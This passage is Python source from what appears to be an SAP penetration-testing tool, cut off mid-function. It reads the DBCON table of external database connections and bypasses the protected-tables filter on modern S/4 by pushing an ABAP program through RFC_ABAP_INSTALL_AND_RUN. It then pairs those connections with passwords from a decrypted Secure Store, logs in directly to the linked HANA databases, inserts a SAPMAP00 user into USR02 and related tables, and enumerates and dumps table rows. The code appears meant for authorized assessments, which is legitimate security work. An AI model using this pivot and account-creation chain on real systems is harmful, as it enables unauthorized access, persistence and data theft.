"""ABAP DBCON — external-DB direct-pivot primitive (issue #21).

An ABAP system's DBCON table (SM49 / DBACOCKPIT / tx DBCO) holds
one row per external database the system opens via NATIVE_SQL /
ADBC.  Each row is:

    CON_NAME   – logical name (e.g. HDB_DWH, ORA_LEGACY)
    DBMS       – HDB | ORA | MSS | DB6 | ADA | SYB
    USER_NAME  – DB user
    CON_ENV    – DBMS-specific connect string
                  HDB : ``host:port`` (or ``host:port?databaseName=…``)
                  ORA : TNS descriptor blob or Easy-Connect
                  MSS : ``SERVER=host,port;`` fragments
                  DB6 : ``DB=name;HOST=host;PORT=port``
                  ADA : ``host:dbname``

The password itself is NOT in DBCON — it lives in the ABAP Secure
Store under key ``/DBCON/<CON_NAME>`` (RSECTAB).  When SAPMAP has
already decrypted the SecStore, we have the missing half.

This module pairs the two:

  read_dbcon(source_node, creds)
        Reads DBCON via RFC_READ_TABLE (with USE_ET_DATA_4_RETURN
        set — modern S/4 refuses to fill DATA[] otherwise).
        Returns [{con_name, dbms, user, con_env}, ...].

  integrate_dbcon_from_secstore(source_node, state, creds)
        Runs `read_dbcon`, joins with every `db`-category SecStore
        entry on the node, and appends the resulting complete
        tuples as DBCONConnection dataclasses on
        source_node.dbcon_edges.  Emits an INFO finding per resolved
        edge.  Idempotent — re-runs replace existing edges keyed by
        CON_NAME.

  probe_dbcon_edge(edge)      →   opens the driver-level connection,
                                  probes for USR02 → SAP-shape flag,
                                  reads T000-SYSID when SAP-shape.
                                  Sets edge.tested / reachable /
                                  is_sap_shape / target_sid / error.

  create_sapmap_user_via_dbcon(edge, sid, client, node)
        Runs the same USR02/USR04/UST04/USRBF2 INSERT chain that
        _execute_sql_via_gateway does — but via the direct DB
        driver, no SAPXPG / gateway involvement.  Returns
        {ok, error, verified}.

v1 supports **HANA (HDB) only** — the DBMS field is checked and
non-HDB edges are marked with error="v1 supports HDB only".
Oracle / MSSQL / DB2 support follows in v2.
"""
from __future__ import annotations

import re as _re
from datetime import datetime, timezone
from typing import Optional

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, DBCONConnection, CreatedUser,
)


# ============================================================================
# DBCON table read via RFC_READ_TABLE
# ============================================================================

def read_dbcon(node: SAPNode, creds: Credentials = None) -> list:
    """Read the DBCON table via RFC_READ_TABLE.

    Modern S/4 kernels refuse to fill RFC_READ_TABLE's DATA
    exporting table unless the caller passes ``USE_ET_DATA_4_RETURN
    = 'X'`` — plain call returns rows count but empty data.  We
    always set that flag; older kernels ignore the parameter, so
    it's safe as a default.

    Returns a list of dicts:
        [{"con_name": "HDB_DWH", "dbms": "HDB", "user": "SAPMAP",
          "con_env": "10.0.0.14:30215"}, ...]
    Empty list on read failure (silent — caller decides whether to
    surface the failure).
    """
    from sapmap_rfc import _get_connection
    from sapmap_config import RFC_READ_TABLE
    from sapmap_errors import format_rfc_exception

    # DBCON has been renamed / split across releases.  Try each
    # candidate in order and keep the first that returns rows.
    #   DBCON        — canonical ABAP DBCON table
    #   DBCONNAM     — text/name view on newer S/4
    #   DBCONUSR     — user-fields table on split releases
    #   V_DBCON      — DDIC view exposing the merged connect record
    CANDIDATE_TABLES = ["DBCON", "DBCONNAM", "DBCONUSR", "V_DBCON"]
    FIELD_VARIANTS = [
        # Modern S/4 field list — CON_NAME + DBMS + USER_NAME + CON_ENV
        [{"FIELDNAME": "CON_NAME"}, {"FIELDNAME": "DBMS"},
         {"FIELDNAME": "USER_NAME"}, {"FIELDNAME": "CON_ENV"}],
        # Older 7.x — CONN_INFO holds the connect string, PASSWORD is
        # blank because it moved to RSECTAB
        [{"FIELDNAME": "CON_NAME"}, {"FIELDNAME": "DBMS"},
         {"FIELDNAME": "USER_NAME"}, {"FIELDNAME": "CONN_INFO"}],
    ]

    def _do_call(conn, table, field_list, with_flag):
        kw = dict(QUERY_TABLE=table, DELIMITER="|",
                  FIELDS=field_list, ROWCOUNT=500)
        if with_flag:
            kw["USE_ET_DATA_4_RETURN"] = "X"
        return conn.call(RFC_READ_TABLE, **kw)

    def _pick_rows(res):
        # The flag is called USE_ET_DATA_4_RETURN but the export
        # parameter the FM actually populates is ET_DATA (confirmed
        # via SE37 on S/4 2025).  Some kernels alias it to
        # ET_DATA_4_RETURN — read both, prefer whichever has rows.
        wide = (res.get("ET_DATA") or res.get("ET_DATA_4_RETURN") or [])
        narrow = res.get("DATA") or []
        return (wide if wide else narrow, len(narrow), len(wide))

    result = None
    table_used = None
    used_flag = False
    field_variant_used = 0
    return_msgs = []
    try:
        with _get_connection(node, creds) as conn:
            for table in CANDIDATE_TABLES:
                for v_idx, field_list in enumerate(FIELD_VARIANTS):
                    try:
                        try:
                            res = _do_call(conn, table, field_list, with_flag=True)
                            _flag = True
                        except Exception as _e_flag:
                            # Kernel doesn't know the kwarg — retry plain
                            res = _do_call(conn, table, field_list, with_flag=False)
                            _flag = False
                    except Exception as _e_table:
                        # Table doesn't exist here — move on to the next
                        # candidate.  Only log for the primary table.
                        if table == "DBCON":
                            print(f"[*] {node.sid}: read_dbcon: {table} + "
                                  f"variant {v_idx} raised "
                                  f"{format_rfc_exception(_e_table)}")
                        continue
                    raw, n_narrow, n_wide = _pick_rows(res)
                    return_msgs = [
                        f"{m.get('TYPE','?')}: {m.get('MESSAGE','')}"
                        for m in (res.get("RETURN") or [])
                        if m.get("MESSAGE")]
                    if raw:
                        result = res
                        table_used = table
                        used_flag = _flag
                        field_variant_used = v_idx
                        break
                    else:
                        print(f"[*] {node.sid}: read_dbcon: {table} "
                              f"variant {v_idx} → 0 rows (DATA={n_narrow}, "
                              f"ET_DATA={n_wide}, flag={_flag})"
                              + (f" — RETURN: {return_msgs}"
                                 if return_msgs else ""))
                if result is not None:
                    break
    except Exception as e:
        print(f"[-] {node.sid}: read_dbcon: connection/call failed — "
              f"{format_rfc_exception(e)}")
        return []

    if result is None:
        # RFC_READ_TABLE came back clean but with 0 rows on every
        # candidate.  This is the fingerprint of the hardened
        # protected-tables list on modern S/4 (SAP Notes 2246160 /
        # 3242476 / 3181974): the FM returns success with an empty
        # DATA table instead of NOT_AUTHORIZED when the queried table
        # is on the deny-list.  Escape hatch: push a tiny ABAP program
        # via RFC_ABAP_INSTALL_AND_RUN that SELECTs from DBCON
        # directly — bypasses the FM's table filter entirely.
        print(f"[*] {node.sid}: read_dbcon: RFC_READ_TABLE returned "
              f"empty for every candidate table — falling back to "
              f"RFC_ABAP_INSTALL_AND_RUN direct SELECT (works around "
              f"modern-S/4 protected-tables list)")
        return _read_dbcon_via_abap(node, creds)

    raw, n_narrow, n_wide = _pick_rows(result)
    print(f"[*] {node.sid}: read_dbcon: {table_used} (variant "
          f"{field_variant_used}, flag={used_flag}) → "
          f"{n_wide + n_narrow} row(s) via "
          f"{'wide' if n_wide else 'narrow'} bucket")
    if raw:
        # First-row shape dump — critical when the row parses to zero
        # (WA name / delimiter / structured-vs-flat differs across
        # kernels).  Truncate to 200 chars so it stays log-friendly.
        _first = raw[0]
        _shape = (f"keys={list(_first.keys())} sample="
                   f"{str(_first)[:200]}" if isinstance(_first, dict)
                   else f"type={type(_first).__name__} val={str(_first)[:200]}")
        print(f"[*] {node.sid}: read_dbcon: first row shape → {_shape}")

    rows = []
    for r in raw:
        con_name = dbms = user_name = con_env = ""
        if isinstance(r, dict):
            # Shape A — classic DATA / ET_DATA_4_RETURN: {"WA": "a|b|c|d"}
            wa = r.get("WA") or r.get("ZEILE") or r.get("LINE") or ""
            if wa:
                parts = [p.strip() for p in wa.split("|")]
                if len(parts) >= 4:
                    con_name, dbms, user_name, con_env = parts[:4]
            # Shape B — some kernels populate ET_DATA as a structured
            # row with the DDIC field names directly.
            if not con_name:
                con_name  = (r.get("CON_NAME")  or r.get("con_name") or "").strip()
                dbms      = (r.get("DBMS")       or r.get("dbms")     or "").strip()
                user_name = (r.get("USER_NAME") or r.get("user_name") or "").strip()
                con_env   = (r.get("CON_ENV")   or r.get("con_env")  or r.get("CONN_INFO") or "").strip()
        if not con_name:
            continue
        rows.append({
            "con_name": con_name,
            "dbms":     dbms.upper(),
            "user":     user_name,
            "con_env":  con_env,
        })

    if not rows and raw:
        # Retrieved rows but couldn't parse any — kernel returned an
        # unfamiliar row shape.  Escalate to the ABAP fallback rather
        # than silently drop them.
        print(f"[!] {node.sid}: read_dbcon: {len(raw)} row(s) came "
              f"back from RFC but parser recovered 0 — falling back "
              f"to ABAP SELECT to get a known shape")
        return _read_dbcon_via_abap(node, creds)
    return rows


# ============================================================================
# RFC_ABAP_INSTALL_AND_RUN fallback — bypasses protected-tables list
# ============================================================================

def _read_dbcon_via_abap(node: SAPNode, creds: Credentials = None) -> list:
    """SELECT the DBCON rows via a dynamically-compiled ABAP program.

    Modern S/4 wraps RFC_READ_TABLE with a protected-tables filter
    that returns empty for tables like DBCON without raising
    NOT_AUTHORIZED.  RFC_ABAP_INSTALL_AND_RUN does not apply that
    filter — the SELECT runs in the caller's ABAP session with the
    normal S_TABU_* / S_DEVELOP checks (which the RFC user usually
    already has for its ordinary destination-management work).

    We use '~~~' as the field separator instead of '|' because a
    HANA CON_ENV can legitimately contain '|' inside JDBC-style
    connect strings.
    """
    from sapmap_rfc import _run_abap_program, _get_connection
    from sapmap_errors import format_rfc_exception

    SEP = "~~~"
    abap = [
        "REPORT zsapmap_dbcon.",
        "DATA: BEGIN OF gs,",
        "        con_name  TYPE dbcon-con_name,",
        "        dbms      TYPE dbcon-dbms,",
        "        user_name TYPE dbcon-user_name,",
        "        con_env   TYPE dbcon-con_env,",
        "      END OF gs.",
        "DATA gt LIKE TABLE OF gs.",
        "DATA lv_line TYPE string.",
        "SELECT con_name dbms user_name con_env "
        "FROM dbcon INTO TABLE gt.",
        "LOOP AT gt INTO gs.",
        f"  CONCATENATE gs-con_name '{SEP}' gs-dbms '{SEP}' "
        f"gs-user_name '{SEP}' gs-con_env INTO lv_line.",
        "  WRITE: / lv_line.",
        "ENDLOOP.",
    ]

    try:
        with _get_connection(node, creds) as conn:
            run = _run_abap_program(conn, abap, "ZSAPMAP_DBCON")
    except Exception as e:
        print(f"[-] {node.sid}: read_dbcon_via_abap: connection "
              f"failed — {format_rfc_exception(e)}")
        return []

    if not run["success"]:
        print(f"[-] {node.sid}: read_dbcon_via_abap: "
              f"RFC_ABAP_INSTALL_AND_RUN failed — {run['error']}. "
              f"Grant S_DEVELOP (P_GROUP=SUPER, ACTVT=03) or run "
              f"the DBCON dump manually via SE38.")
        return []

    rows = []
    for line in run["output"]:
        parts = [p.strip() for p in line.split(SEP)]
        if len(parts) < 4 or not parts[0]:
            continue
        rows.append({
            "con_name": parts[0],
            "dbms":     parts[1].upper(),
            "user":     parts[2],
            "con_env":  parts[3],
        })
    print(f"[+] {node.sid}: read_dbcon_via_abap: recovered "
          f"{len(rows)} DBCON row(s) via ABAP SELECT "
          f"(RFC_READ_TABLE was blocked / empty)")
    return rows


# ============================================================================
# CON_ENV parsing — DBMS-specific
# ============================================================================

_HDB_HOSTPORT_RE = _re.compile(
    r"(?P<host>[A-Za-z0-9._\-]+):(?P<port>\d+)")
_HDB_DBNAME_RE = _re.compile(
    r"(?:databaseName|DATABASENAME|DB_NAME)\s*=\s*([A-Za-z0-9_]+)",
    _re.IGNORECASE)


def parse_con_env(dbms: str, con_env: str) -> dict:
    """Parse the DBMS-specific CON_ENV field into (host, port, dbname).

    v1 covers HANA precisely; other DBMSs get a best-effort host
    extraction so the panel still shows *something*, but the direct-
    connect path only fires on HDB.
    """
    out = {"host": "", "port": 0, "dbname": ""}
    if not con_env:
        return out
    dbms = (dbms or "").upper()

    if dbms == "HDB":
        m = _HDB_HOSTPORT_RE.search(con_env)
        if m:
            out["host"] = m.group("host")
            try:
                out["port"] = int(m.group("port"))
            except ValueError:
                out["port"] = 0
        m2 = _HDB_DBNAME_RE.search(con_env)
        if m2:
            out["dbname"] = m2.group(1)
        return out

    # Best-effort fallback for other DBMSs — at least surface a host
    # so the operator sees WHERE the DBCON points, even if v1 can't
    # connect there yet.
    m = _re.search(r"(?:HOST|SERVER|ADDRESS)\s*=\s*([A-Za-z0-9._\-]+)",
                   con_env, _re.IGNORECASE)
    if m:
        out["host"] = m.group(1)
    m = _re.search(r"(?:PORT)\s*=\s*(\d+)", con_env, _re.IGNORECASE)
    if m:
        try:
            out["port"] = int(m.group(1))
        except ValueError:
            pass
    return out


# ============================================================================
# Pair RSECTAB `/DBCON/…` entries with DBCON rows
# ============================================================================

def integrate_dbcon_from_secstore(node: SAPNode, state: SAPMAPState,
                                    creds: Credentials = None) -> list:
    """Pair every `db`-category SecStore entry on the node with a
    DBCON row of the same CON_NAME.  Populates node.dbcon_edges
    with a `DBCONConnection` per pair.  Emits one INFO finding per
    resolved edge.  Returns the list of newly-added edges.

    Idempotent — reruns match by CON_NAME and overwrite the
    previous entry (preserves pwned / tested state).
    """
    db_entries = [e for e in (node.secstore_entries or [])
                  if e.get("category") == "db" and e.get("password")]
    if not db_entries:
        return []

    dbcon_rows = read_dbcon(node, creds)
    if not dbcon_rows:
        print(f"[-] {node.sid}: DBCON pair: DBCON table read returned "
              f"no rows — cannot join {len(db_entries)} DB secstore "
              f"entries to host/port info")
        return []
    dbcon_by_name = {r["con_name"].upper(): r for r in dbcon_rows}

    existing_by_name = {e.con_name.upper(): e
                        for e in (node.dbcon_edges or [])}
    added = []

    for entry in db_entries:
        # /DBCON/<name> — ident_clean strips the MANDT prefix
        ident = entry.get("ident_clean") or entry.get("ident") or ""
        m = _re.match(r"^/DBCON/(.+)$", ident)
        if not m:
            continue
        con_name = m.group(1).strip()
        row = dbcon_by_name.get(con_name.upper())
        if not row:
            print(f"[!] {node.sid}: DBCON pair: SecStore has "
                  f"/DBCON/{con_name} but no DBCON row of that "
                  f"CON_NAME — perhaps stale or renamed")
            continue

        parsed = parse_con_env(row["dbms"], row["con_env"])
        prev = existing_by_name.get(con_name.upper())
        edge = DBCONConnection(
            source_sid=node.sid,
            con_name=con_name,
            dbms=row["dbms"],
            host=parsed["host"],
            port=parsed["port"],
            user=row["user"],
            password=entry["password"],
            dbname=parsed["dbname"],
        )
        # Preserve probe verdicts on re-run
        if prev is not None:
            edge.tested       = prev.tested
            edge.reachable    = prev.reachable
            edge.is_sap_shape = prev.is_sap_shape
            edge.target_sid   = prev.target_sid
            edge.pwned        = prev.pwned
            edge.tested_at    = prev.tested_at
        existing_by_name[con_name.upper()] = edge
        added.append(edge)

    node.dbcon_edges = list(existing_by_name.values())

    if added:
        try:
            from sapmap_findings import emit_finding
            for e in added:
                emit_finding(
                    "INFO", node.sid,
                    f"DBCON {e.con_name} resolved: {e.dbms} "
                    f"{e.user}@{e.host}:{e.port} — credentials "
                    f"available for direct-DB pivot",
                    ref="dbcon.resolved",
                    meta={"con_name": e.con_name, "dbms": e.dbms})
        except Exception:
            pass
    return added


# ============================================================================
# Driver-level probe — v1 covers HANA only
# ============================================================================

def _import_hdbcli():
    """Lazy hdbcli import — returns (module, None) or (None, error_str)."""
    try:
        from hdbcli import dbapi
        return dbapi, None
    except Exception as e:
        return None, (f"hdbcli not installed — pip install hdbcli "
                       f"({type(e).__name__}: {e})")


def _hana_error_code(exc):
    """Extract the HANA numeric error code from an hdbcli exception.

    hdbcli.dbapi.Error carries `.errorcode` on modern versions; older
    versions and generic Exception paths embed it in str(exc) as
    ``(NNN, 'text')``.  Returns int or None.
    """
    for attr in ("errorcode", "sqlcode"):
        v = getattr(exc, attr, None)
        if isinstance(v, int) and v:
            return v
    m = _re.match(r"^\((\d+),", str(exc) or "")
    if m:
        try: return int(m.group(1))
        except ValueError: pass
    return None


def probe_dbcon_edge(edge: DBCONConnection,
                       state: SAPMAPState = None) -> None:
    """Open a driver-level connection to the DBCON target, mark it
    tested + reachable, and fingerprint what's on the other side
    (SAP-shape via USR02, target_sid via T000).  Mutates the edge
    in-place; sets `error` string on any failure so the panel
    surfaces it.

    v1 supports HDB only — other DBMSs are marked `error="v1 supports
    HDB only"` and left untested.
    """
    edge.tested = True
    edge.tested_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
    edge.error = ""

    if edge.dbms != "HDB":
        edge.error = (f"v1 supports HDB only — {edge.dbms} needs a "
                       f"future driver (cx_Oracle / pyodbc / ibm_db)")
        edge.reachable = False
        print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
              f"{edge.error}")
        return

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        edge.reachable = False
        edge.error = err or "hdbcli import failed"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"{edge.error}")
        return

    kwargs = {
        "address":     edge.host,
        "port":        edge.port,
        "user":        edge.user,
        "password":    edge.password,
        "autocommit":  True,
        "communicationTimeout": 15000,
    }
    if edge.dbname:
        kwargs["databaseName"] = edge.dbname

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
          f"connecting hdbcli to {edge.host}:{edge.port} as "
          f"{edge.user}"
          + (f" (tenant {edge.dbname})" if edge.dbname else ""))
    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        edge.reachable = bool(conn.isconnected())
        if not edge.reachable:
            edge.error = "connect returned but isconnected() = False"
            return

        # SAP-shape check: USR02 presence.  Distinguish HANA errors:
        #   259 = invalid table name → definitive non-SAP
        #   258 = insufficient privilege → INCONCLUSIVE (real SAP DB
        #         with a hardened DBCON user looks identical to
        #         non-SAP under a naive presence check)
        cur = conn.cursor()
        try:
            cur.execute("SELECT COUNT(*) FROM USR02")
            _ = cur.fetchone()
            edge.is_sap_shape = True
            edge.sap_shape_reason = "usr02_present"
        except Exception as _e:
            code = _hana_error_code(_e)
            edge.is_sap_shape = False
            if code == 259:
                edge.sap_shape_reason = "usr02_missing"
            elif code == 258:
                edge.sap_shape_reason = "no_permission"
            else:
                edge.sap_shape_reason = "unknown_error"
            edge.error = (f"USR02 probe: HANA {code or '?'} — "
                          f"{str(_e)[:200]}")
        finally:
            cur.close()

        if edge.is_sap_shape:
            # Grab the SID from T000 to plot on the map
            cur = conn.cursor()
            try:
                cur.execute("SELECT SYSID FROM T000")
                r = cur.fetchone()
                if r and r[0]:
                    edge.target_sid = str(r[0]).strip()
            except Exception:
                pass
            finally:
                cur.close()
            print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"SAP-shape DB confirmed"
                  + (f" (target SID {edge.target_sid})"
                     if edge.target_sid else "")
                  + " — direct SAPMAP00 create possible")
            # Materialise the target as a real SAP node so the map
            # shows it and normal scan/exploit flow can reach it.
            if state is not None and edge.target_sid:
                try:
                    materialize_target_as_sap_node(edge, state)
                except Exception as _mat_ex:
                    print(f"[-] materialize skipped: {_mat_ex}")
        else:
            _hint = {
                "usr02_missing": "definitive non-SAP HANA (USR02 does "
                                  "not exist)",
                "no_permission": "INCONCLUSIVE — DBCON user lacks "
                                  "SELECT on USR02.  Could still be a "
                                  "real SAP DB with hardened creds",
                "unknown_error": "probe raised an unrecognised HANA "
                                  "error — inspect edge.error",
            }.get(edge.sap_shape_reason, "unknown")
            print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"connected; SAP-shape verdict: NO — {_hint}")
    except Exception as e:
        edge.reachable = False
        edge.error = f"{type(e).__name__}: {e}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"connect failed: {edge.error}")
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:
            pass


# ============================================================================
# Direct SAPMAP00 create via the DBCON connection
# ============================================================================

def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
                                   client: str = "000",
                                   state: SAPMAPState = None,
                                   source_node: SAPNode = None) -> dict:
    """Run the SAPMAP00 create-user SQL chain directly via the DBCON
    driver — bypasses RFC + SAPXPG entirely.  Requires the DBCON
    target to be SAP-shape (USR02 present).  Uses the same SQL
    templates as _execute_sql_via_gateway so behaviour matches the
    kernel-relayed path.

    Returns {ok: bool, error: str, verified: bool, statements_ok: int,
             statements_total: int}.
    """
    result = {"ok": False, "error": "", "verified": False,
              "statements_ok": 0, "statements_total": 0}
    if edge.dbms != "HDB":
        result["error"] = (f"v1 supports HDB only, edge dbms={edge.dbms}")
        return result
    if not edge.reachable:
        result["error"] = "edge not reachable — run Test Connection first"
        return result
    if not edge.is_sap_shape:
        result["error"] = "target is not a SAP-shape DB (USR02 missing)"
        return result

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        result["error"] = err
        return result

    from sapmap_config import sql_hana, sapmap_username

    sapmap_user = sapmap_username(0)   # SAPMAP00
    sql_statements = sql_hana(target_sid, client, sapmap_user)
    real_stmts = [s for s in sql_statements
                  if s.strip().upper() != "GO"]
    result["statements_total"] = len(real_stmts)

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — direct "
          f"HANA user-creation: {len(real_stmts)} SQL statement(s) "
          f"against {edge.host}:{edge.port}"
          + (f" tenant {edge.dbname}" if edge.dbname else ""))

    kwargs = {
        "address":     edge.host,
        "port":        edge.port,
        "user":        edge.user,
        "password":    edge.password,
        "autocommit":  True,
        "communicationTimeout": 60000,
    }
    if edge.dbname:
        kwargs["databaseName"] = edge.dbname

    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        for idx, sql in enumerate(sql_statements, 1):
            if sql.strip().upper() == "GO":
                continue
            cur = conn.cursor()
            try:
                cur.execute(sql)
                result["statements_ok"] += 1
                print(f"[+] {edge.source_sid}: DBCON {edge.con_name} "
                      f"[{idx}/{len(sql_statements)}] ✓ accepted")
            except Exception as e:
                # HANA raises on duplicate PK for USR02 re-inserts,
                # which is fine on re-run — treat as non-fatal, log
                # but don't abort the chain.
                emsg = str(e)[:200]
                if "unique constraint violated" in emsg.lower():
                    print(f"[*] {edge.source_sid}: DBCON "
                          f"{edge.con_name} [{idx}/{len(sql_statements)}]"
                          f" already exists (re-run) — continuing")
                    result["statements_ok"] += 1
                else:
                    print(f"[-] {edge.source_sid}: DBCON "
                          f"{edge.con_name} [{idx}/{len(sql_statements)}]"
                          f" ✗ rejected: {emsg}")
            finally:
                cur.close()

        # Verify: USR02 row landed?
        cur = conn.cursor()
        try:
            cur.execute(
                "SELECT COUNT(*) FROM USR02 WHERE MANDT=? AND BNAME=?",
                (client, sapmap_user))
            row = cur.fetchone()
            result["verified"] = bool(row and int(row[0]) > 0)
        except Exception as e:
            result["error"] = f"verify failed: {type(e).__name__}: {e}"
        finally:
            cur.close()

        result["ok"] = result["verified"]
        if result["ok"]:
            edge.pwned = True
            print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"SAPMAP00 created on {target_sid}/{client} via "
                  f"direct HANA connection — verified in USR02")
            # Record as CreatedUser on the source node so the
            # engagement report + cleanup pass see it.
            if source_node is not None:
                try:
                    source_node.created_users.append(CreatedUser(
                        username=sapmap_user,
                        sid=target_sid,
                        client=client,
                        hostname=edge.host,
                        ip=edge.host,
                        instance_nr="00",
                        method="dbcon_direct",
                    ))
                except Exception:
                    pass
        else:
            if not result["error"]:
                result["error"] = ("SQL chain finished but USR02 "
                                    "verify returned 0 rows")
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:
            pass
    return result


# ============================================================================
# Non-SAP data-extraction: table enumeration + row-peek
# ============================================================================

def enumerate_hana_tables(edge: DBCONConnection, limit: int = 200) -> dict:
    """List tables visible to the DBCON user via SYS.M_TABLES.

    Works on both SAP and non-SAP HANA — a defender-friendly way to
    show WHAT this DBCON gives up when the direct-SQL user-create
    path isn't available (non-SAP DB, or SAP DB where USR02 probe
    was inconclusive).

    Returns {ok, error, count, tables: [{schema, table, rows,
    table_type}...]}.  Tables are sorted by row count desc so the
    biggest / most interesting ones show up first.  System schemas
    (_SYS_*, SYS, PUBLIC) are filtered — they're noise for an
    engagement.  Cached on edge.enumerated_tables so the panel can
    re-render without re-querying.
    """
    out = {"ok": False, "error": "", "count": 0, "tables": []}
    if edge.dbms != "HDB":
        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
        return out
    if not edge.reachable:
        out["error"] = "edge not reachable — Test Connection first"
        return out

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        out["error"] = err
        return out

    kwargs = {
        "address": edge.host, "port": edge.port,
        "user": edge.user, "password": edge.password,
        "autocommit": True, "communicationTimeout": 30000,
    }
    if edge.dbname: kwargs["databaseName"] = edge.dbname

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
          f"enumerating tables via SYS.M_TABLES (limit={limit})")
    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        cur = conn.cursor()
        try:
            cur.execute(
                "SELECT SCHEMA_NAME, TABLE_NAME, RECORD_COUNT, TABLE_TYPE "
                "FROM SYS.M_TABLES "
                "WHERE SCHEMA_NAME NOT LIKE '\\_SYS\\_%' ESCAPE '\\' "
                "  AND SCHEMA_NAME NOT IN ('SYS', 'PUBLIC', 'SYSTEM') "
                "ORDER BY RECORD_COUNT DESC "
                "LIMIT ?", (int(limit),))
            for row in cur.fetchall():
                out["tables"].append({
                    "schema":     str(row[0] or ""),
                    "table":      str(row[1] or ""),
                    "rows":       int(row[2] or 0),
                    "table_type": str(row[3] or ""),
                })
        finally:
            cur.close()

        # Fallback: SYS.M_TABLES may itself be restricted on hardened
        # HANA — try the SQL-standard information_schema view.
        if not out["tables"]:
            print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"SYS.M_TABLES returned 0 rows, trying SYS.TABLES")
            cur = conn.cursor()
            try:
                cur.execute(
                    "SELECT SCHEMA_NAME, TABLE_NAME "
                    "FROM SYS.TABLES "
                    "WHERE SCHEMA_NAME NOT LIKE '\\_SYS\\_%' ESCAPE '\\' "
                    "  AND SCHEMA_NAME NOT IN ('SYS', 'PUBLIC', 'SYSTEM') "
                    "LIMIT ?", (int(limit),))
                for row in cur.fetchall():
                    out["tables"].append({
                        "schema": str(row[0] or ""),
                        "table":  str(row[1] or ""),
                        "rows":   -1,   # unknown — SYS.TABLES doesn't carry it
                        "table_type": "",
                    })
            finally:
                cur.close()

        out["ok"] = True
        out["count"] = len(out["tables"])
        edge.enumerated_tables = list(out["tables"])
        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
              f"enumerated {out['count']} tables "
              f"(top schemas: "
              f"{sorted(set(t['schema'] for t in out['tables']))[:5]})")
    except Exception as e:
        code = _hana_error_code(e)
        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"enumerate_hana_tables failed: {out['error']}")
    finally:
        try:
            if conn is not None: conn.close()
        except Exception: pass
    return out


# ---------------------------------------------------------------------------
# Row-peek: SELECT TOP N from a chosen table for quick reconnaissance
# ---------------------------------------------------------------------------

_HANA_IDENT_RE = _re.compile(r"^[A-Za-z_][A-Za-z0-9_$#]*$")


def peek_hana_table(edge: DBCONConnection, schema: str, table: str,
                      limit: int = 10) -> dict:
    """SELECT the first `limit` rows from schema.table via the DBCON.

    Whitelists identifiers against HANA's naming rules — SQL
    injection defence for the schema/table strings that come from
    the operator's ctx-menu click on an enumerated row.

    Returns {ok, error, columns: [str], rows: [[val, ...]], truncated}.
    """
    out = {"ok": False, "error": "", "columns": [], "rows": [],
           "truncated": False}
    if not _HANA_IDENT_RE.match(schema or ""):
        out["error"] = f"invalid schema identifier: {schema!r}"
        return out
    if not _HANA_IDENT_RE.match(table or ""):
        out["error"] = f"invalid table identifier: {table!r}"
        return out
    if edge.dbms != "HDB":
        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
        return out
    if not edge.reachable:
        out["error"] = "edge not reachable"
        return out

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        out["error"] = err
        return out

    kwargs = {
        "address": edge.host, "port": edge.port,
        "user": edge.user, "password": edge.password,
        "autocommit": True, "communicationTimeout": 30000,
    }
    if edge.dbname: kwargs["databaseName"] = edge.dbname

    limit = max(1, min(int(limit), 500))
    sql = f'SELECT * FROM "{schema}"."{table}" LIMIT {limit}'
    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — peek: {sql}")
    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        cur = conn.cursor()
        try:
            cur.execute(sql)
            out["columns"] = [d[0] for d in (cur.description or [])]
            def _cell(v):
                if v is None:
                    return None
                # hdbcli returns memoryview / bytes for RAW/BLOB/LOB
                # columns.  str(memoryview) → "<memory at 0x…>" which
                # is useless; hex-encode instead (matches the USR02
                # dump format so CSVs are downstream-compatible).
                if isinstance(v, memoryview):
                    return v.tobytes().hex().upper()
                if isinstance(v, (bytes, bytearray)):
                    return bytes(v).hex().upper()
                if hasattr(v, "isoformat"):
                    return v.isoformat()
                return str(v)
            for r in cur.fetchall():
                out["rows"].append([_cell(v) for v in r])
            out["truncated"] = len(out["rows"]) == limit
            out["ok"] = True
        finally:
            cur.close()
        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — peek "
              f"{schema}.{table}: {len(out['rows'])} row(s), "
              f"{len(out['columns'])} column(s)"
              + (" (truncated)" if out["truncated"] else ""))
    except Exception as e:
        code = _hana_error_code(e)
        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — peek "
              f"{schema}.{table} failed: {out['error']}")
    finally:
        try:
            if conn is not None: conn.close()
        except Exception: pass
    return out


# ============================================================================
# Column browser — describe a table before peeking it
# ============================================================================

def describe_hana_table(edge: DBCONConnection, schema: str,
                          table: str) -> dict:
    """Return column metadata for `schema.table` via SYS.TABLE_COLUMNS.

    Enables the operator to see WHICH columns are in a table before
    pulling rows.  Returns {ok, error, columns: [{name, type, len,
    nullable, position}]}.
    """
    out = {"ok": False, "error": "", "columns": []}
    if not _HANA_IDENT_RE.match(schema or ""):
